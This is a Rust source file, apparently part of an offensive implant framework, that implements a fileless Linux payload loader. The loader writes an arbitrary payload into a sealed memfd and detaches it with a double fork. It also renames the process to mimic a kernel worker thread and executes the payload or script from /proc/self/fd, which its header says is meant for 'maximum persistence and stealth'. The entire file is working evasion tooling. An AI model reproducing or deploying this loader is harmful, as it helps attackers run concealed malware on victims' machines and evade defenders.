// Linux Memory Loader (MemoryLoader V2)
// 
// Implements Fileless Execution with Image Sealing (MFD_ALLOW_SEALING)
// and Double-Fork detachment for maximum persistence and stealth.

use super::MigrationStatus;
use std::ffi::CString;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::io::Write;
use log::{debug, error, info, warn};

pub struct LinuxMemoryLoader;

impl LinuxMemoryLoader {
    /// 无文件执行并锁定映像 (File Sealing)
    pub async fn load_advanced(&self, payload: Vec<u8>, fake_name: Option<&str>) -> MigrationStatus {
        if payload.is_empty() { return MigrationStatus::PayloadCorrupted; }
        
        // 1. Create memfd with sealing allowed
        let memfd_name = CString::new("").unwrap();
        // MFD_CLOEXEC = 0x01, MFD_ALLOW_SEALING = 0x02
        let fd = unsafe { libc::memfd_create(memfd_name.as_ptr(), 0x0001 | 0x0002) };
        
        if fd == -1 {
            return MigrationStatus::InjectionFailed(format!("memfd_create failed: {}", std::io::Error::last_os_error()));
        }

        // 2. Write payload
        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        if let Err(e) = file.write_all(&payload) {
            return MigrationStatus::InjectionFailed(format!("Write to memfd failed: {}", e));
        }

        // 3. APPLY FILE SEALS (盾牌 🛡️)
        // F_ADD_SEALS = 1030
        // F_SEAL_SHRINK = 0x0002, F_SEAL_GROW = 0x0004, F_SEAL_WRITE = 0x0008, F_SEAL_SEAL = 0x0010
        unsafe {
            libc::fcntl(fd, 1030, 0x0002 | 0x0004 | 0x0008 | 0x0010);
            libc::fchmod(fd, 0o700);
        }

        // 4. Double-Fork Detachment
        info!("[*] Initiating Double-Fork detachment...");
        
        unsafe {
            match libc::fork() {
                -1 => return MigrationStatus::InjectionFailed("First fork failed".to_string()),
                0 => {
                    // --- First Child ---
                    libc::setsid(); // become session leader
                    
                    match libc::fork() {
                        -1 => libc::_exit(1),
                        0 => {
                            // 🚀 SCRIPT DETECTION & EXECUTION
                            let mut interpreter_cmd = "/bin/sh".to_string();
                            let mut is_script = false;
                            
                            if payload.len() > 2 && payload[0] == b'#' && payload[1] == b'!' {
                                if let Ok(line) = String::from_utf8(payload.iter().take(128).cloned().collect()) {
                                    if let Some(first_line) = line.lines().next() {
                                        interpreter_cmd = first_line[2..].trim().to_string();
                                        is_script = true;
                                    }
                                }
                            }

                            // Set fake name
                            let process_name = fake_name.unwrap_or("[kworker/u2:1-events]");
                            if let Ok(c_name) = CString::new(process_name) {
                                libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
                            }
                            
                            // Prepare execution path
                            let memfd_path = format!("/proc/self/fd/{}", fd);
                            
                            if is_script {
                                debug!("Executing script via interpreter: {}", interpreter_cmd);
                                if let (Ok(c_interpreter), Ok(c_memfd)) = (CString::new(interpreter_cmd), CString::new(memfd_path)) {
                                    let args = [c_interpreter.as_ptr(), c_memfd.as_ptr(), std::ptr::null()];
                                    let envs = [std::ptr::null()];
                                    libc::execve(c_interpreter.as_ptr(), args.as_ptr(), envs.as_ptr());
                                }
                            } else {
                                if let Ok(c_path) = CString::new(memfd_path) {
                                    let args = [c_path.as_ptr(), std::ptr::null()];
                                    let envs = [std::ptr::null()];
                                    libc::execve(c_path.as_ptr(), args.as_ptr(), envs.as_ptr());
                                }
                            }
                            libc::_exit(1);
                        }
                        _ => libc::_exit(0), // First child exits
                    }
                }
                _ => {
                    // --- Parent process (Loader) returns success ---
                    debug!("First fork parent returning Success");
                }
            }
        }

        MigrationStatus::Success
    }
}
